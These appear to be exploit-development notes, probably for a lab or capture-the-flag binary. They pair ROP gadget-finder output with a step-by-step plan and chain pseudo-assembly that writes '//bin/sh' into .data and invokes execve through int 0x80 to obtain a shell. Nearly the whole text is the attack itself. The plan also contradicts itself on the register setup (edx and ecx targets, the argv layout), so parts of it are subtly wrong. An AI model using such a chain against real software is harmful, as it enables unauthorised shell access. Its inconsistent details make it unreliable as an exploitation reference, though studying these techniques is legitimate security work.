- Step 1 -- Write-what-where gadgets

    [E] Extra gadget: 0x0804ffde : dec eax ; pop eax ; mov dword ptr [ecx + 0xb0], edx ; repz ret
	[+] Gadget found: 0x8056e65 mov dword ptr [edx], eax ; ret
	
	[+] Gadget found: 0x806ee6b pop edx ; ret
	[+] Gadget found: 0x8056420 xor eax, eax ; ret
	[E] Extra gadget: 0x08049adb : pop edi ; ret
	[E] Extra gadget: 0x0807416e : pop eax ; call edi
	[E] Extra gadget: 0x08049adc : ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x8056420 xor eax, eax ; ret
	[+] Gadget found: 0x807c2fa inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x80481c9 pop ebx ; ret
	[+] Gadget found: 0x806ee92 pop ecx ; pop ebx ; ret
	[+] Gadget found: 0x806ee6b pop edx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x8049563 int 0x80

Goal: Call execve("/bin/sh", ["/bin/sh", NULL], NULL)
execve has syscall number 11
eax = 11
ebx = /bin/sh, NULL
ecx = pointer to /bin/sh, NULL
edx = NULL

Use the .data section to put arguments - Always starts at 0x080da060

Steps:
Write '//bi' to 0x080da060
Write 'n/sh' to 0x080da064
Write NULL to 0x080da068
Point ebx to 0x080da060
Point edx to 0x080da060
Point ecx to 0x080da068
Set eax to 11
Syscall

Assembler code:

// Write data as needed
pop edx = 0x080da060 (.data)
pop edi = 0x08049adb (pop edi ; ret)
pop eax = 0x69622f2f ('//bi')
mov dword ptr [edx], eax
pop edx = 0x080da064 (.data+4)
pop edi = 0x08049adb (pop edi ; ret)
pop eax = 0x68732f6e ('n/sh')
mov dword ptr [edx], eax
pop edx = 0x080da068 (.data+8)
xor eax, eax (Sets eax to NULL)
mov dword ptr [edx], eax

// Setup arguments
pop ecx = 0x080da060 and pop ebx = 0x080da060 (.data)
pop edx = 0x080da068 (.data+8)

// Setup syscall number
inc eax 11 times (0+11=11 for execve)

// Run it
int 0x80